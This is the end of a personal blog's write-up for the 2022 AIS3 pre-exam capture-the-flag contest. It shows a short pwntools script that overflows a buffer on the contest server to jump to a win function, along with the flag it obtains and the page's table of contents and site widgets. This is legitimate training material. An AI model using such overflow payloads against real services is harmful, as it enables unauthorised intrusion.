<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r=remote(<span class="string">&#x27;chals1.ais3.org&#x27;</span>,<span class="number">12347</span>)</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line">r.sendline(<span class="string">b&#x27;A&#x27;</span>*(<span class="number">24</span>)+p64(<span class="number">0x401216</span>))</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br><span class="line"><span class="comment">#AIS3&#123;Re@1_B0F_m4st3r!!&#125;</span></span><br></pre></td></tr></table></figure>

<p>FLAG:<code>AIS3&#123;Re@1_B0F_m4st3r!!&#125;</code></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:alb105322129@gmail.com">Albert Huang</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://albert-notes.github.io/2022/06/11/AIS3-2022-preexam/">http://albert-notes.github.io/2022/06/11/AIS3-2022-preexam/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/AIS3/">AIS3</a><a class="post-meta__tags" href="/tags/Security/">Security</a><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/img/ais2.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-full"><a href="/2022/02/01/linear-algebra-3/"><img class="prev-cover" src="/img/mat2.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">Linear Algebra III-Group</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> Related Articles</span></div><div class="relatedPosts-list"><div><a href="/2021/06/06/AIS3-2021-preexam/" title="2021 AIS3 Pre-exam Write Up"><img class="cover" src="/img/ais.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-06</div><div class="title">2021 AIS3 Pre-exam Write Up</div></div></a></div><div><a href="/2021/06/06/myfirstctf-2021/" title="2021 MyFirstCTF Write Up"><img class="cover" src="/img/mfc.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2021-06-06</div><div class="title">2021 MyFirstCTF Write Up</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/alb.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Albert Huang</div><div class="author-info__description">Decide your own life.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">15</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/albert-notes"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/albert-notes" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:alb105322129@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="https://www.facebook.com/albert.huang.57/" target="_blank" title="Facebook"><i class="fab fa-facebook"></i></a><a class="social-icon" href="https://www.instagram.com/albert.huang_57/" target="_blank" title="Instagram"><i class="fab fa-instagram"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">《拓》 2022 全國高中生大合唱出爐囉 ! 趕快去 Music 分頁點播 !</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Welcome"><span class="toc-number">1.</span> <span class="toc-text">Welcome</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Welcome-100"><span class="toc-number">1.1.</span> <span class="toc-text">Welcome [100]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Crypto"><span class="toc-number">2.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SC-100-baby"><span class="toc-number">2.1.</span> <span class="toc-text">SC [100] [baby]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Fast-Cipher-100-baby"><span class="toc-number">2.2.</span> <span class="toc-text">Fast Cipher [100] [baby]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Misc"><span class="toc-number">3.</span> <span class="toc-text">Misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Excel-100-baby"><span class="toc-number">3.1.</span> <span class="toc-text">Excel [100] [baby]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gift-in-the-dream-100-medium"><span class="toc-number">3.2.</span> <span class="toc-text">Gift in the dream [100] [medium]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Reverse"><span class="toc-number">4.</span> <span class="toc-text">Reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Time-Management-100-baby"><span class="toc-number">4.1.</span> <span class="toc-text">Time Management [100] [baby]</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-1"><span class="toc-number">4.1.1.</span> <span class="toc-text">Solution 1</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Solution-2"><span class="toc-number">4.1.2.</span> <span class="toc-text">Solution 2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Calculator-301-easy-NET"><span class="toc-number">4.2.</span> <span class="toc-text">Calculator [301] [easy][.NET]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%AE%BC-463-easy"><span class="toc-number">4.3.</span> <span class="toc-text">殼 [463] [easy]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">5.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-File-Uploader-100-easy"><span class="toc-number">5.1.</span> <span class="toc-text">Simple File Uploader [100] [easy]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Poking-Bear-100-baby"><span class="toc-number">5.2.</span> <span class="toc-text">Poking Bear [100] [baby]</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn"><span class="toc-number">6.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SAAS-Crash-40-C-heap-easy"><span class="toc-number">6.1.</span> <span class="toc-text">SAAS - Crash [40] [C++][heap][easy]</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#BOF2WIN-100-baby"><span class="toc-number">6.2.</span> <span class="toc-text">BOF2WIN [100] [baby]</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2022/06/11/AIS3-2022-preexam/" title="2022 AIS3 Pre-exam Write Up"><img src="/img/ais2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2022 AIS3 Pre-exam Write Up"/></a><div class="content"><a class="title" href="/2022/06/11/AIS3-2022-preexam/" title="2022 AIS3 Pre-exam Write Up">2022 AIS3 Pre-exam Write Up</a><time datetime="2022-06-11T00:40:08.000Z" title="Created 2022-06-11 08:40:08">2022-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/02/01/linear-algebra-3/" title="Linear Algebra III-Group"><img src="/img/mat2.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linear Algebra III-Group"/></a><div class="content"><a class="title" href="/2022/02/01/linear-algebra-3/" title="Linear Algebra III-Group">Linear Algebra III-Group</a><time datetime="2022-02-01T02:02:45.000Z" title="Created 2022-02-01 10:02:45">2022-02-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/31/linear-algebra-2/" title="Linear Algebra II-Linear Algebra"><img src="/img/mat.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linear Algebra II-Linear Algebra"/></a><div class="content"><a class="title" href="/2022/01/31/linear-algebra-2/" title="Linear Algebra II-Linear Algebra">Linear Algebra II-Linear Algebra</a><time datetime="2022-01-31T06:02:44.000Z" title="Created 2022-01-31 14:02:44">2022-01-31</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2022/01/25/linear-algebra-1/" title="Linear Algebra I-Preface and Prior Knowledge"><img src="/img/math.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linear Algebra I-Preface and Prior Knowledge"/></a><div class="content"><a class="title" href="/2022/01/25/linear-algebra-1/" title="Linear Algebra I-Preface and Prior Knowledge">Linear Algebra I-Preface and Prior Knowledge</a><time datetime="2022-01-25T01:24:04.000Z" title="Created 2022-01-25 09:24:04">2022-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/12/26/Momoshiro/" title="寫畫桃城-桃花心木的深情記憶"><img src="/img/tsm.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="寫畫桃城-桃花心木的深情記憶"/></a><div class="content"><a class="title" href="/2021/12/26/Momoshiro/" title="寫畫桃城-桃花心木的深情記憶">寫畫桃城-桃花心木的深情記憶</a><time datetime="2021-12-26T04:48:00.000Z" title="Created 2021-12-26 12:48:00">2021-12-26</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Albert Huang</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="font-plus" type="button" title="Increase font size"><i class="fas fa-plus"></i></button><button id="font-minus" type="button" title="Decrease font size"><i class="fas fa-minus"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">Local search</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>if (!window.MathJax) {
  window.MathJax = {
    loader: {
      source: {
        '[tex]/amsCd': '[tex]/amscd'
      }
    },
    tex: {
      inlineMath: [ ['$','$'], ["\\(","\\)"]],
      tags: 'ams'
    },
    options: {
      renderActions: {
        findScript: [10, doc => {
          for (const node of document.querySelectorAll('script[type^="math/tex"]')) {
            const display = !!node.type.match(/; *mode=display/)
            const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display)
            const text = document.createTextNode('')
            node.parentNode.replaceChild(text, node)
            math.start = {node: text, delim: '', n: 0}
            math.end = {node: text, delim: '', n: 0}
            doc.math.push(math)
          }
        }, ''],
        addClass: [200,() => {
          document.querySelectorAll('mjx-container:not([display=\'true\']').forEach( node => {
            const target = node.parentNode
            if (!target.classList.contains('has-jax')) {
              target.classList.add('mathjax-overflow')
            }
          })
        }, '', false]
      }
    }
  }
  
  const script = document.createElement('script')
  script.src = 'https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js'
  script.id = 'MathJax-script'
  script.async = true
  document.head.appendChild(script)
} else {
  MathJax.startup.document.state(0)
  MathJax.texReset()
  MathJax.typeset()
}</script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/katex.min.css"><script src="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/katex@latest/dist/contrib/copy-tex.css"><script>(() => {
  document.querySelectorAll('#article-container span.katex-display').forEach(item => {
    btf.wrap(item, 'div', '', 'katex-wrap')
  })
})()</script><script>if (document.getElementsByClassName('mermaid').length) {
  if (window.mermaidJsLoad) mermaid.init()
  else {
    getScript('https://cdn.jsdelivr.net/npm/mermaid/dist/mermaid.min.js').then(() => {
      window.mermaidJsLoad = true
      mermaid.initialize({
        theme: 'default',
      })
      false && mermaid.init()
    })
  }
}</script></div><script src="//code.tidio.co/qqpjqsklrzstouh4l6ias23ukyxcbm3p.js" async></script><script src="/js/exten.js"></script><link rel="stylesheet" href="/css/exten.css"><script src="https://cdn.jsdelivr.net/gh/sviptzk/HexoStaticFile@latest/Hexo/js/mouse_snow.min.js"></script><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/fireworks.min.js"></script><script defer="defer" id="fluttering_ribbon" mobile="true" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script src="//code.tidio.co/qqpjqsklrzstouh4l6ias23ukyxcbm3p.js" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>